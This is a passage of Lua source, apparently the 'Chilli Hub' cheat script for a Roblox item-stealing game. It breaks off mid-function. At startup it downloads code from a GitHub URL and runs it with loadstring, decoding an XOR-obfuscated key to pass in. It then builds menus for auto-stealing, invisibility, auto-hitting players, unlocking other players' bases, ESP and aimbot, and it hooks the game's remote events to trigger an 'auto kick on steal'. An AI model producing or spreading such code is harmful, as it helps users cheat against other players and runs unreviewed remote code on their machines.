local chilliGithubFastManualDefaultsRu, uiLibrary, mainWindow, defaultTab, espTab, miscTab, serverTab, tab, Players, RunService
local Workspace, Lighting, CoreGui, HttpService, ReplicatedStorage, UserInputService, TeleportService, TextService, Stats, localPlayer
local generateRandomId, weakCache, tbl, section, flag, fn, tbl2, runUntilTimeout, characterSection, invisibilitySection
local respawnSection

do
	local playerTab, ContextActionService, helperSection, aimbotSection

	do
		local helperTab, ProximityPromptService, TweenService, autoStealBrainrotSection, str, n, flag2, flag3, flag4, n2
		local flag5, n3, flag6, n4, RagdollController, UserInputService2, connection, flag7, n5, n6
		local prompt, tbl3, n7, chilliAutoGetRuntime, cleanup, fn2, fn3, disconnectAll, fn4, fn5
		local fn6, prompt2, fn7, fn8, fn9, str2, fn10, fn11, chilliMacLibTargetGui, fn12
		local fn13, fn14, fn15, fn16, chilliAutoGetBarGui, holder, textLabel, textLabel2, frame

		do
			local value = rawget(_G, "__ChilliGithubFastManualDefaultsRun")

			if type(value) == "table" then
				local window = value.Window

				if type(window) == "table" and window._destroyed ~= true then
					pcall(function()
						window:Open()
					end)

					return
				end

				local now = tonumber(value.StartedAt) or os.clock()
				if value.Status == "loading" and os.clock() - now < 30 then
					return
				end
			end

			chilliGithubFastManualDefaultsRu = { Status = "loading", StartedAt = os.clock() }
			_G.__ChilliGithubFastManualDefaultsRun = chilliGithubFastManualDefaultsRu

			local function compileChunk()
				local response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/Chilli%20Library")
				local chunk, loadErr = loadstring(response)
				assert(chunk, loadErr)
				local bootstrapFn = chunk()
				assert(type(bootstrapFn) == "function", "Chilli Library bootstrap is invalid.")
				local list = table.create(45)
				local n8 = 1

				for idx = 1, 90, 2 do
					list[n8] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", idx, idx + 1), 16), string.byte("s9K!2vQ#", (n8 - 1) % 8 + 1)))
					n8 += 1
				end

				return bootstrapFn(table.concat(list))
			end

			uiLibrary = compileChunk()
			assert(type(uiLibrary) == "table" and type(uiLibrary.CreateWindow) == "function" and type(uiLibrary.Finalize) == "function", "Chilli Library returned an invalid API.")
			chilliGithubFastManualDefaultsRu.Library = uiLibrary

			uiLibrary.ManualQuickDefaults = {
				PinnedFeatures = {
					"Stealer > Auto Steal Brainrot > Auto Steal",
					"Helper > Movement & Combat > Float",
					"Helper > Movement & Combat > Auto Hit Nearest Player",
					"Player > Jump Boost > Auto Jump",
					"Player > Jump Boost > Limit Jump Height",
					"Player > Invisibility > Invisible",
					"Server > Server > Kick",
					"Helper > Unlock Base > Auto Unlock Base",
					"Helper > Unlock Base > Unlock Floor 3",
					"Helper > Unlock Base > Unlock Floor 2",
					"Helper > Unlock Base > Unlock Floor 1",
					"Player > Respawn > Fast Reset",
					"Player > Speed Boost > Tool Speed Boost",
					"Stealer > Auto Steal Brainrot > Drop Brainrot",
					"Helper > Helper > Instant Clone Swap",
					"Player > Speed Boost > Adjust Auto Speed",
					"Player > Invisibility > Auto Invisible On Steal",
					"Player > Invisibility > Rotation",
					"Player > Invisibility > Auto Rotation",
					"Player > Invisibility > Depth",
					"Player > Invisibility > Lagback Detect",
					"Player > Invisibility > Auto Fix Lagback",
				},
				Keybinds = {
					["Player > Respawn > Fast Reset"] = "X",
					["Player > Jump Boost > Limit Jump Height"] = "N",
					["Player > Speed Boost > Tool Speed Boost"] = "Q",
					["Player > Jump Boost > Auto Jump"] = "V",
					["Player > Invisibility > Invisible"] = "U",
					["Helper > Movement & Combat > Float"] = "B",
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = "G",
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = "R",
					["Server > Server > Kick"] = "J",
					["Helper > Helper > Instant Clone Swap"] = "F",
					["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true,
					["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true,
				},
				PinGroups = {
					["Player > Respawn > Fast Reset"] = 5,
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = 1,
					["Helper > Unlock Base > Unlock Floor 3"] = 4,
					["Helper > Helper > Instant Clone Swap"] = 5,
					["Player > Speed Boost > Adjust Speed"] = 2,
					["Player > Jump Boost > Jump Height"] = 1,
					["Player > Invisibility > Auto Rotation"] = 2,
					["Helper > Unlock Base > Auto Unlock Base"] = 4,
					["Helper > Aimbot > Auto Paintball"] = 3,
					["Helper > Unlock Base > Unlock Floor 1"] = 4,
					["Player > Speed Boost > Adjust Auto Speed"] = 2,
					["Player > Invisibility > Lagback Detect"] = 2,
					["Player > Invisibility > Auto Invisible On Steal"] = 2,
					["Player > Invisibility > Invisible"] = 2,
					["Player > Invisibility > Auto Fix Lagback"] = 2,
					["Player > Speed Boost > Tool Speed Boost"] = 1,
					["Player > Invisibility > Depth"] = 2,
					["Stealer > Auto Kick > Auto Kick on Steal"] = 5,
					["Helper > Helper > Anti Body Swap"] = 5,
					["Player > Invisibility > Rotation"] = 2,
					["Helper > Unlock Base > Unlock Floor 2"] = 4,
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = 5,
					["Server > Server > Kick"] = 5,
				},
				LeftCenterHidden = true,
			}

			mainWindow = uiLibrary:CreateWindow({ Name = "Chilli Hub", DefaultTab = "Main" })
			chilliGithubFastManualDefaultsRu.Window = mainWindow
			defaultTab = mainWindow:GetDefaultTab()
			local autoKickSection

			do
				local stealerTab = mainWindow:CreateTab("Stealer")
				helperTab = mainWindow:CreateTab("Helper")
				playerTab = mainWindow:CreateTab({ Name = "Player", SectionsExpanded = false })
				espTab = mainWindow:CreateTab("ESP")
				miscTab = mainWindow:CreateTab("Misc")
				serverTab = mainWindow:CreateTab("Server")
				tab = mainWindow:CreateTab("AP&TP")
				Players = game:GetService("Players")
				RunService = game:GetService("RunService")
				Workspace = game:GetService("Workspace")
				Lighting = game:GetService("Lighting")
				CoreGui = game:GetService("CoreGui")
				HttpService = game:GetService("HttpService")
				ReplicatedStorage = game:GetService("ReplicatedStorage")
				UserInputService = game:GetService("UserInputService")
				ContextActionService = game:GetService("ContextActionService")
				TeleportService = game:GetService("TeleportService")
				ProximityPromptService = game:GetService("ProximityPromptService")
				TextService = game:GetService("TextService")
				TweenService = game:GetService("TweenService")
				Stats = game:GetService("Stats")
				localPlayer = Players.LocalPlayer
				local charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
				local rng = Random.new()

				generateRandomId = function()
					local list = table.create(64)
					local str3 = HttpService:GenerateGUID(false):gsub("-", "")

					for idx = 1, #str3 do
						list[#list + 1] = str3:sub(idx, idx)
					end

					for idx = 1, 32 do
						local randInt = rng:NextInteger(1, #charset)
						list[#list + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"):sub(randInt, randInt)
					end

					for idx = #list, 2, -1 do
						local randInt = rng:NextInteger(1, idx)
						local v = list[idx]
						list[idx] = list[randInt]
						list[randInt] = v
					end

					return table.concat(list)
				end

				weakCache = setmetatable({}, { __mode = "k" })
				tbl = {}
				autoStealBrainrotSection = stealerTab:CreateSection({ Name = "Auto Steal Brainrot", Expanded = true })
				autoKickSection = stealerTab:CreateSection({ Name = "Auto Kick", Expanded = true })
			end

			do
				local flag8 = false
				local flag9 = true
				local flag10 = false
				local n8 = 0
				local n9 = 1000000
				local v = nil
				local n10 = -math.huge
				local connections = {}
				local weakCache2 = setmetatable({}, { __mode = "k" })
				local tbl4 = {}

				pcall(function()
					local Animals = require(ReplicatedStorage.Datas.Animals)

					if type(Animals) == "table" then
						tbl4 = Animals
					end
				end)

				local function formatCompact(arg)
					local match, match2 = tostring(arg or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
					if not match then
						return nil
					end
					local num = tonumber(match)
					if not num then
						return nil
					end
					return num * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(match2)] or 1)
				end

				local function toNumberOrDefault(arg)
					local Animal = tbl4[tostring(arg or "")]
					return type(Animal) == "table" and tonumber(Animal.Generation) or 0
				end

				local function fn17()
					local tbl5 = {}
					local debris = Workspace:FindFirstChild("Debris")

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
								local animalOverhead = child:FindFirstChild("AnimalOverhead")
								local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
								animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Generation")

								if displayName and animalOverhead and displayName:IsA("TextLabel") and animalOverhead:IsA("TextLabel") then
									local formattedText = formatCompact(animalOverhead.Text)

									if formattedText then
										local str3 = tostring(displayName.Text)
										tbl5[str3] = tbl5[str3] or {}
										tbl5[str3][#tbl5[str3] + 1] = { Position = child.Position, Generation = formattedText }
									end
								end
							end
						end
					end

					return tbl5
				end

				local function fn18(arg, arg2, arg3)
					local numVal = toNumberOrDefault(arg)

					if arg2 then
						local v2, v3, v4 = ipairs((arg3 or fn17())[tostring(arg or "")] or {})
						local n11 = 14

						for _, v5 in v2, v3, v4 do
							local magnitude = (v5.Position - arg2).Magnitude

							if magnitude < n11 then
								numVal = v5.Generation
								n11 = magnitude
							end
						end
					end

					return numVal
				end

				local function fn19()
					local v2 = Workspace:FindFirstChild(localPlayer.Name)
					if not v2 or not v2:IsA("Model") then
						return nil
					end
					return v2:FindFirstChild("HumanoidRootPart") or v2:FindFirstChild("__HITBOX")
				end

				local chilliAutoKickOnStealRuntime = CoreGui:FindFirstChild("__ChilliAutoKickOnStealRuntime")

				if chilliAutoKickOnStealRuntime then
					local cleanup2 = chilliAutoKickOnStealRuntime:FindFirstChild("Cleanup")

					if cleanup2 and cleanup2:IsA("BindableEvent") then
						pcall(function()
							cleanup2:Fire()
						end)
					end

					pcall(function()
						chilliAutoKickOnStealRuntime:Destroy()
					end)
				end

				local chilliAutoKickOnStealRuntime2 = Instance.new("Folder")
				chilliAutoKickOnStealRuntime2.Name = "__ChilliAutoKickOnStealRuntime"
				chilliAutoKickOnStealRuntime2.Archivable = false
				chilliAutoKickOnStealRuntime2.Parent = CoreGui
				local cleanup2 = Instance.new("BindableEvent")
				cleanup2.Name = "Cleanup"
				cleanup2.Parent = chilliAutoKickOnStealRuntime2

				local function disconnectAll2()
					for _, connection2 in ipairs(connections) do
						if connection2.Connected then
							connection2:Disconnect()
						end
					end

					table.clear(connections)
					table.clear(weakCache2)
				end

				local fn20 = nil

				fn20 = function(arg, arg2, arg3)
					local kind = typeof(arg)

					if kind == "string" then
						local str3 = string.lower(arg)
						if string.find(str3, "you stole", 1, true) or string.find(str3, "successfully stole", 1, true) then
							return arg
						end
						return nil
					end

					if not (kind ~= "table" or arg3 >= 3 or arg2[arg]) then
						arg2[arg] = true

						for k, v2 in pairs(arg) do
							local v3 = fn20(k, arg2, arg3 + 1) or fn20(v2, arg2, arg3 + 1)
							if v3 then
								return v3
							end
						end
					end

					return nil
				end

				local function kickPlayer(...)
					local v2 = table.pack(...)

					if flag8 then
						local v3 = table.pack(table.unpack(v2, 1, v2.n))
						local tbl5 = {}
						local exitTo = nil
						local v4

						for idx = 1, v3.n do
							v4 = fn20(v3[idx], tbl5, 0)
							if v4 then
								exitTo = 1
								break
							end
						end

						if exitTo ~= 1 then
							return
						end
						local match = string.match(v4, ">([^<>]-)</font>")
						local v5 = fn19()

						if not (fn18(match, v5 and v5.Position) < n9) then
							local match2 = match and match ~= ""
							local str3 = "\nAUTO KICK ACTIVATED"

							if match2 then
								str3 = "\nAUTO KICK ACTIVATED" .. "\nYou stole: " .. match
							end

							flag8 = false
							localPlayer:Kick(str3)
							return
						end
					end
				end

				local function fn21(descendant)
					if not flag8 or not descendant:IsA("RemoteEvent") or weakCache2[descendant] then
						return
					end
					weakCache2[descendant] = true
					connections[#connections + 1] = descendant.OnClientEvent:Connect(kickPlayer)
				end

				local function fn22()
					flag8 = false
					disconnectAll2()
				end

				local function fn23()
					fn22()
					flag8 = true
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					packages = packages and packages:FindFirstChild("Net")
					if not packages then
						flag8 = false
						return
					end

					for _, descendant in ipairs(packages:GetDescendants()) do
						fn21(descendant)
					end

					fn21(packages)
					connections[#connections + 1] = packages.DescendantAdded:Connect(fn21)
				end

				local function fn24()
					flag9 = false
					flag10 = false
					n8 += 1
					fn22()
				end

				cleanup2.Event:Connect(fn24)
				chilliAutoKickOnStealRuntime2.Destroying:Connect(fn24)

				autoKickSection:CreateToggle({
					Name = "Auto Kick on Steal",
					Default = false,
					Callback = function(arg)
						if arg then
							fn23()
						else
							fn22()
						end
					end,
				})

				local configMap = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
				}

				local autoKickMinValueSlider = nil
				local n11 = 1
				local str3 = "M/s"

				local function fn25(arg, arg2)
					if arg ~= nil then
						n11 = math.floor(tonumber(arg) or n11)
					end

					if arg2 ~= nil then
						str3 = tostring(arg2)
					elseif autoKickMinValueSlider.GetUnit then
						local unit = autoKickMinValueSlider:GetUnit()

						if unit and unit ~= "" then
							str3 = tostring(unit)
						end
					end

					n9 = n11 * (configMap[str3] or configMap["M/s"]).Mult
					v = nil
					n10 = -math.huge
				end

				local function fn26(arg)
					str3 = tostring(arg)
					local configEntry = configMap[str3] or configMap["M/s"]

					if autoKickMinValueSlider.SetRange then
						autoKickMinValueSlider:SetRange(configEntry.Min, configEntry.Max)
						local min = autoKickMinValueSlider:Get() or configEntry.Min
						local min2 = configEntry.Min
						local max = configEntry.Max
						local n12 = math.clamp(math.floor(min + 0.5), min2, max)

						if n12 ~= min then
							autoKickMinValueSlider:Set(n12)
						else
							fn25(n12, str3)
						end
					else
						fn25(nil, str3)
					end
				end

				autoKickMinValueSlider = autoKickSection:CreateSlider({
					Name = "Auto Kick Min Value",
					Note = "Only kicks for Brainrots at or above this generation value.",
					Min = 0,
					Max = 1000,
					Default = 10,
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),
						},
						Callback = function(arg)
							fn26(arg)
						end,
					},
					Quick = false,
					Callback = function(arg)
						fn25(arg, nil)
					end,
				})
			end

			str = "Steal"
			local n8
			n8 = 2
			n = 0.25
			flag2 = true
			flag3 = false
			flag4 = false
			n2 = 1000000
			flag5 = false
			n3 = 20
			flag6 = false
			n4 = 0
			RagdollController = nil

			pcall(function()
				RagdollController = require(game:GetService("ReplicatedStorage").Controllers.RagdollController)
			end)

			UserInputService2 = game:GetService("UserInputService")

			connection = UserInputService2.InputBegan:Connect(function(input, gameProcessed)
				if not gameProcessed and input.KeyCode == Enum.KeyCode.Backspace then
					n4 = os.clock()
				end
			end)

			flag7 = false
			n5 = 0
			local n9
			n9 = 0
			n6 = -math.huge
			prompt = nil
			tbl3 = {}
			n7 = -math.huge
			local fn17

			do
				local list = {}
				local chilliAutoGetRuntime2 = CoreGui:FindFirstChild("__ChilliAutoGetRuntime")

				if chilliAutoGetRuntime2 then
					local cleanup2 = chilliAutoGetRuntime2:FindFirstChild("Cleanup")

					if cleanup2 and cleanup2:IsA("BindableEvent") then
						pcall(function()
							cleanup2:Fire()
						end)
					end

					pcall(function()
						chilliAutoGetRuntime2:Destroy()
					end)
				end

				chilliAutoGetRuntime = Instance.new("Folder")
				chilliAutoGetRuntime.Name = "__ChilliAutoGetRuntime"
				chilliAutoGetRuntime.Archivable = false
				chilliAutoGetRuntime.Parent = CoreGui
				cleanup = Instance.new("BindableEvent")
				cleanup.Name = "Cleanup"
				cleanup.Parent = chilliAutoGetRuntime

				fn2 = function(arg)
					list[#list + 1] = arg
					return arg
				end

				local n10 = 10
				local weakCache2 = setmetatable({}, { __mode = "k" })

				fn17 = function(arg, arg2)
					if not arg or not arg.Parent or not arg.Visible then
						return false
					end
					local absolutePosition = arg.AbsolutePosition
					local absoluteSize = arg.AbsoluteSize
					return arg2.X >= absolutePosition.X and arg2.X <= absolutePosition.X + absoluteSize.X and arg2.Y >= absolutePosition.Y and arg2.Y <= absolutePosition.Y + absoluteSize.Y
				end

				fn2(UserInputService2.InputChanged:Connect(function(input)
					local v = weakCache2[input]

					if v then
						local vector2 = Vector2.new(input.Position.X, input.Position.Y)
						v.Position = vector2

						if (vector2 - v.Start).Magnitude > n10 then
							v.Cancelled = true
						end
					end
				end))

				fn2(UserInputService2.InputEnded:Connect(function(input)
					local v = weakCache2[input]
					if not v then
						return
					end
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					v.Position = vector2

					if (vector2 - v.Start).Magnitude > n10 or not fn17(v.Button, vector2) then
						v.Cancelled = true
					end

					task.delay(0.2, function()
						if weakCache2[input] == v then
							weakCache2[input] = nil
						end
					end)
				end))

				fn3 = function(arg, arg2)
					fn2(arg.InputBegan:Connect(function(input)
						if not (input.UserInputType ~= Enum.UserInputType.Touch or input.UserInputState ~= Enum.UserInputState.Begin) then
							local vector2 = Vector2.new(input.Position.X, input.Position.Y)

							if fn17(arg, vector2) then
								weakCache2[input] = { Button = arg, Start = vector2, Position = vector2, Cancelled = false }
							end
						end
					end))

					return fn2(arg.Activated:Connect(function(inputObject)
						if inputObject and inputObject.UserInputType == Enum.UserInputType.Touch then
							local v = weakCache2[inputObject]
							if not v or v.Button ~= arg or v.Cancelled or not fn17(arg, v.Position) then
								return
							end
						end

						arg2()
					end))
				end

				disconnectAll = function()
					for _, v in ipairs(list) do
						if v.Connected then
							v:Disconnect()
						end
					end

					table.clear(list)
				end
			end

			local v, v2, fn18, fn19, toNumberOrDefault

			do
				local v3 = nil
				v = nil
				v2 = nil
				local datas = ReplicatedStorage:FindFirstChild("Datas")

				if datas then
					local animals = datas:FindFirstChild("Animals")

					if animals and animals:IsA("ModuleScript") then
						local ok, result = pcall(require, animals)

						if ok and type(result) == "table" then
							v3 = result
						end
					end

					local mutations = datas:FindFirstChild("Mutations")

					if mutations and mutations:IsA("ModuleScript") then
						local ok, result = pcall(require, mutations)

						if ok and type(result) == "table" then
							v = result
						end
					end

					local traits = datas:FindFirstChild("Traits")

					if traits and traits:IsA("ModuleScript") then
						local ok, result = pcall(require, traits)

						if ok and type(result) == "table" then
							v2 = result
						end
					end
				end

				fn18 = function(arg)
					return string.lower(tostring(arg or ""))
				end

				fn19 = function(arg)
					if not arg then
						local flag8 = arg and arg ~= Workspace
						if not flag8 then
							return nil
						end
						local isBasePart = arg:IsA("BasePart")
						local isBasePart2 = isBasePart and arg.Name == "Spawn"
						if isBasePart2 then
							return arg
						end
					end

					while true do
						arg = arg.Parent

						if arg and arg ~= Workspace then
							if arg:IsA("BasePart") and arg.Name == "Spawn" then
								return arg
							end
							continue
						end

						break
					end

					return nil
				end

				toNumberOrDefault = function(arg)
					if not (not v3 or not arg or arg == "") then
						local v4 = v3[arg]
						if type(v4) == "table" then
							return tonumber(v4.Generation) or 0
						end
					end

					return 0
				end
			end

			local brainrotNameTiers
			brainrotNameTiers = {}
			local tbl4
			tbl4 = { Limit = 1000000 }

			do
				local colorSequenceNew = ColorSequence.new
				local tbl5 = {}
				local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
				local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
				local colorSequenceKeypointNew = ColorSequenceKeypoint.new
				local color3FromRGB = Color3.fromRGB
				tbl5[1] = colorKeypoint
				tbl5[2] = colorKeypoint2

				do
					local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(214, 142, 12)))
					table.move(values, 1, values.n, 3, tbl5)
				end

				tbl4.Text = colorSequenceNew(tbl5)
			end

			do
				local colorSequenceNew = ColorSequence.new
				local tbl5 = {}
				local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
				local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
				local colorSequenceKeypointNew = ColorSequenceKeypoint.new
				local color3FromRGB = Color3.fromRGB
				tbl5[1] = colorKeypoint
				tbl5[2] = colorKeypoint2

				do
					local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(20, 12, 0)))
					table.move(values, 1, values.n, 3, tbl5)
				end

				tbl4.Stroke = colorSequenceNew(tbl5)
			end

			local tbl5
			tbl5 = { Limit = 10000000 }

			do
				local colorSequenceNew = ColorSequence.new
				local tbl6 = {}
				local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
				local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
				local colorSequenceKeypointNew = ColorSequenceKeypoint.new
				local color3FromRGB = Color3.fromRGB
				tbl6[1] = colorKeypoint
				tbl6[2] = colorKeypoint2

				do
					local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(206, 92, 0)))
					table.move(values, 1, values.n, 3, tbl6)
				end

				tbl5.Text = colorSequenceNew(tbl6)
			end

			do
				local colorSequenceNew = ColorSequence.new
				local tbl6 = {}
				local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
				local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
				local colorSequenceKeypointNew = ColorSequenceKeypoint.new
				local color3FromRGB = Color3.fromRGB
				tbl6[1] = colorKeypoint
				tbl6[2] = colorKeypoint2

				do
					local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(18, 8, 0)))
					table.move(values, 1, values.n, 3, tbl6)
				end

				tbl5.Stroke = colorSequenceNew(tbl6)
			end

			do
				local tbl6 = { Limit = 100000000 }
				local colorSequenceNew = ColorSequence.new
				local tbl7 = {}
				local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
				local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
				local colorSequenceKeypointNew = ColorSequenceKeypoint.new
				local color3FromRGB = Color3.fromRGB
				tbl7[1] = colorKeypoint
				tbl7[2] = colorKeypoint2

				do
					local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(196, 42, 0)))
					table.move(values, 1, values.n, 3, tbl7)
				end

				tbl6.Text = colorSequenceNew(tbl7)
				local colorSequenceNew2 = ColorSequence.new
				local tbl8 = {}
				local colorKeypoint3 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
				local colorKeypoint4 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
				local colorSequenceKeypointNew2 = ColorSequenceKeypoint.new
				local color3FromRGB2 = Color3.fromRGB
				tbl8[1] = colorKeypoint3
				tbl8[2] = colorKeypoint4

				do
					local values = table.pack(colorSequenceKeypointNew2(1, color3FromRGB2(18, 4, 0)))
					table.move(values, 1, values.n, 3, tbl8)
				end

				tbl6.Stroke = colorSequenceNew2(tbl8)
				local tbl9 = { Limit = math.huge }
				local colorSequenceNew3 = ColorSequence.new
				local tbl10 = {}
				local colorKeypoint5 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
				local colorKeypoint6 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
				local colorSequenceKeypointNew3 = ColorSequenceKeypoint.new
				local color3FromRGB3 = Color3.fromRGB
				tbl10[1] = colorKeypoint5
				tbl10[2] = colorKeypoint6

				do
					local values = table.pack(colorSequenceKeypointNew3(1, color3FromRGB3(184, 0, 18)))
					table.move(values, 1, values.n, 3, tbl10)
				end

				tbl9.Text = colorSequenceNew3(tbl10)
				local colorSequenceNew4 = ColorSequence.new
				local tbl11 = {}
				local colorKeypoint7 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
				local colorKeypoint8 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
				local colorSequenceKeypointNew4 = ColorSequenceKeypoint.new
				local color3FromRGB4 = Color3.fromRGB
				tbl11[1] = colorKeypoint7
				tbl11[2] = colorKeypoint8

				do
					local values = table.pack(colorSequenceKeypointNew4(1, color3FromRGB4(18, 0, 3)))
					table.move(values, 1, values.n, 3, tbl11)
				end

				tbl9.Stroke = colorSequenceNew4(tbl11)
				brainrotNameTiers[1] = tbl4
				brainrotNameTiers[2] = tbl5
				brainrotNameTiers[3] = tbl6
				brainrotNameTiers[4] = tbl9
			end

			chilliGithubFastManualDefaultsRu.BrainrotNameTiers = brainrotNameTiers

			chilliGithubFastManualDefaultsRu.BrainrotNameTier = function(arg)
				local n10 = tonumber(arg) or 0

				for _, brainrotNameTier in ipairs(chilliGithubFastManualDefaultsRu.BrainrotNameTiers) do
					if n10 < brainrotNameTier.Limit then
						return brainrotNameTier
					end
				end

				return chilliGithubFastManualDefaultsRu.BrainrotNameTiers[#chilliGithubFastManualDefaultsRu.BrainrotNameTiers]
			end

			chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle = function(parent)
				parent.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1.15
				uiStroke.Transparency = 0.08
				uiStroke.Parent = parent
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Rotation = 90
				uiGradient2.Parent = parent
				return { Label = parent, Outline = uiStroke, Text = uiGradient2, Stroke = uiGradient }
			end

			chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle = function(arg, arg2)
				if not arg then
					return
				end

				if tonumber(arg2) == nil then
					arg.Label.TextColor3 = Color3.fromRGB(238, 238, 242)
					arg.Outline.Color = Color3.fromRGB(0, 0, 0)
					arg.Outline.Transparency = 0.28
					arg.Text.Enabled = false
					arg.Stroke.Enabled = false
					return
				end

				local arg22 = chilliGithubFastManualDefaultsRu.BrainrotNameTier(arg2)
				arg.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
				arg.Outline.Transparency = 0.08
				arg.Text.Enabled = true
				arg.Stroke.Enabled = true
				arg.Text.Color = arg22.Text
				arg.Stroke.Color = arg22.Stroke
			end

			do
				local n10 = 0.5
				local weakCache2 = setmetatable({}, { __mode = "k" })

				local function fn20(arg)
					local v3 = fn19(arg)

					if v3 then
						if fn18(v3.Name) ~= "lucky block" then
							for _, descendant in ipairs(v3:GetDescendants()) do
								if descendant:IsA("TextLabel") and fn18(descendant.Name) == "stolen" and descendant.Visible and fn18(descendant.Text) == "fusing" then
									return true
								end
							end

							return false
						end

						return true
					end

					return false
				end

				fn4 = function(arg)
					local now = os.clock()
					local v3 = weakCache2[arg]
					if v3 and now < v3.ExpiresAt then
						return v3.Value
					end
					local v4 = fn20(arg)

					if v3 then
						v3.Value = v4
						v3.ExpiresAt = now + n10
					else
						weakCache2[arg] = { Value = v4, ExpiresAt = now + n10 }
					end

					return v4
				end
			end

			fn5 = function(arg)
				local n10 = tonumber(arg) or 0
				if n10 >= 1e9 then
					return string.format("%.2fB/s", n10 / 1e9)
				end

				if n10 >= 1000000 then
					return string.format("%.2fM/s", n10 / 1000000)
				end

				if n10 >= 1000 then
					return string.format("%.1fK/s", n10 / 1000)
				end
				return string.format("%d/s", math.floor(n10))
			end

			do
				local function fn20(arg)
					if not arg or arg == "" then
						return nil
					end
					local match, match2 = arg:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

					if match then
						local n10 = tonumber(match) or 0
						local str3 = match2:upper()

						if str3 == "K" then
							n10 *= 1000
						elseif str3 == "M" then
							n10 *= 1000000
						elseif str3 == "B" then
							n10 *= 1e9
						elseif str3 == "T" then
							n10 *= 1e12
						end

						return n10
					end

					return nil
				end

				local function fn21(arg, arg2, arg3, arg4)
					local numVal = toNumberOrDefault(arg3)
					arg = arg and arg.Position
					if not arg then
						return numVal
					end
					local arg42 = arg4 and arg4[arg3]
					local overhead = nil

					if arg42 then
						local v3, v4, v5 = ipairs(arg4[arg3])
						local n10 = 14
						overhead = nil

						for _, v6 in v3, v4, v5 do
							local magnitude = (v6.Position - arg).Magnitude

							if magnitude < n10 then
								overhead = v6.Overhead
								n10 = magnitude
							end
						end
					end

					local v3 = nil

					if arg2 then
						local v4, v5, v6 = ipairs(arg2:GetChildren())
						local n10 = 14
						v3 = nil

						for _, v7 in v4, v5, v6 do
							if v7:IsA("Model") and v7.Name == arg3 then
								local rootPart = v7:FindFirstChild("RootPart") or v7.PrimaryPart or v7:FindFirstChildWhichIsA("BasePart")

								if rootPart then
									local magnitude = (rootPart.Position - arg).Magnitude

									if magnitude < n10 then
										n10 = magnitude
										v3 = v7
									end
								end
							end
						end
					end

					local text

					if overhead and overhead:FindFirstChild("Mutation") and overhead.Mutation.Visible and overhead.Mutation.Text ~= "" then
						text = overhead.Mutation.Text
					else
						text = nil

						if v3 then
							local attribute = v3:GetAttribute("Mutation") or v3:GetAttribute("__mutation")
							local attribute2 = attribute and tostring(attribute) ~= ""
							text = nil

							if attribute2 then
								text = tostring(attribute)
							end
						end
					end

					local matchs = {}
					local matchMap = {}

					if v3 then
						for _, child in ipairs(v3:GetChildren()) do
							local match = child.Name:match("^_Trait%.(.+)$")

							if match and not matchMap[match] then
								matchMap[match] = true
								table.insert(matchs, match)
							end
						end

						local attribute = v3:GetAttribute("Trait") or v3:GetAttribute("Traits")

